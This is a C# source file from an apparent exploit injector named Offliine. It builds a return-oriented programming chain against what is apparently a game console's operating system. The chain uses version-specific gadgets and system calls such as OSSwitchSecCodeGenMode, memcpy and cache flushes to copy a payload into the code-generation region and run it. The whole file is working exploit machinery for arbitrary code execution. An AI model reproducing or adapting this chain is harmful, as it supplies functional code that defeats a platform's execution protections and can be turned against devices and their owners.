using Java.IO;

namespace Offliine.Injection
{
    public class RopChain
    {
        public static byte[] Generate(int heapAddr, SystemVersion version, int sourceAddr)
        {
            var payloadSize = 131072;
            var codegenAddr = 25165824;

            var output = new ByteArrayOutputStream();

            _switchToCore1(version, output);
            _copyCodebinToCodegen(codegenAddr, sourceAddr, payloadSize, version, output);
            _popr24Tor31(version.Constants.OsFatal(), version.Constants.Exit(), version.Constants.OsDynLoadAcquire(),
                version.Constants.OsDynLoadFindExport(), version.Constants.OsSnprintf(), sourceAddr, 8, heapAddr,
                version, output);

            Util.WriteU32(codegenAddr, output);
            Util.WriteU32(0, output);
            _copyCodebinToCodegen(codegenAddr, sourceAddr, payloadSize, version, output);

            _popr24Tor31(version.Constants.OsFatal(), version.Constants.Exit(), version.Constants.OsDynLoadAcquire(),
                version.Constants.OsDynLoadFindExport(), version.Constants.OsSnprintf(), sourceAddr, 8, heapAddr,
                version, output);

            Util.WriteU32(codegenAddr, output);
            
            output.Close();

            return output.ToByteArray();
        }

        private static void _copyCodebinToCodegen(int codegenAddr, int sourceAddr, int payloadSize,
            SystemVersion version, OutputStream output)
        {
            _osSwitchCodeGenMode(0, version, output);
            _memcpy(codegenAddr, sourceAddr, payloadSize, version, output);
            _osSwitchCodeGenMode(1, version, output);
            _dcFlushRange(codegenAddr, payloadSize, version, output);
            _icInvalidateRange(codegenAddr, payloadSize, version, output);
        }

        private static void _dcFlushRange(int addr, int size, SystemVersion version, OutputStream output)
        {
            _callFunction(version, version.Constants.DcFlushRange(), addr, size, 0, 0, 0, output);
        }

        private static void _icInvalidateRange(int addr, int size, SystemVersion version, OutputStream output)
        {
            _callFunction(version, version.Constants.IcInvalidateRange(), addr, size, 0, 0, 0, output);
        }

        private static void _memcpy(int dest, int src, int size, SystemVersion version, OutputStream output)
        {
            _callFunction(version, version.Constants.Memcpy(), dest, src, size, 0, 0, output);
        }

        private static void _osSwitchCodeGenMode(int mode, SystemVersion version, OutputStream output)
        {
            _callFunction(version, version.Constants.OsSwitchSecCodeGenMode(), mode, 0, 0, 0, 0, output);
        }

        private static void _switchToCore1(SystemVersion version, OutputStream output)
        {
            _callFunction(version, version.Constants.OsGetCurrentThread(), 0, 2, 0, 0,
                version.Constants.OsSetThreadAffinity(), output);

            Util.WriteU32(version.Constants.Callr28PopR28ToR31(), output);
            Util.WriteU32(version.Constants.OsYieldThread(), output);
            Util.WriteU32(0, output);
            Util.WriteU32(0, output);
            Util.WriteU32(0, output);
            Util.WriteU32(0, output);
            Util.WriteU32(version.Constants.Callr28PopR28ToR31(), output);
            Util.WriteU32(0, output);
            Util.WriteU32(0, output);
            Util.WriteU32(0, output);
            Util.WriteU32(0, output);
            Util.WriteU32(0, output);
        }

        private static void _callFunction(SystemVersion version, int function, int r3, int r4, int r5, int r6, int r28,
            OutputStream output)
        {
            _popr24Tor31(r6, r5, 0, version.Constants.Callr28PopR28ToR31(), function, r3, 0, r4, version, output);
            Util.WriteU32(version.Constants.Callfunc(), output);
            Util.WriteU32(r28, output);
            Util.WriteU32(0, output);
            Util.WriteU32(0, output);
            Util.WriteU32(0, output);
            Util.WriteU32(0, output);
        }

        private static void _popr24Tor31(int r24, int r25, int r26, int r27, int r28, int r29, int r30, int r31,
            SystemVersion version, OutputStream output)
        {
            Util.WriteU32(version.Constants.PopR24ToR31(), output);
            Util.WriteU32(0, output);
            Util.WriteU32(0, output);

            Util.WriteU32(r24, output);
            Util.WriteU32(r25, output);
            Util.WriteU32(r26, output);
            Util.WriteU32(r27, output);
            Util.WriteU32(r28, output);
            Util.WriteU32(r29, output);
            Util.WriteU32(r30, output);
            Util.WriteU32(r31, output);

            Util.WriteU32(0, output);
        }
    }
}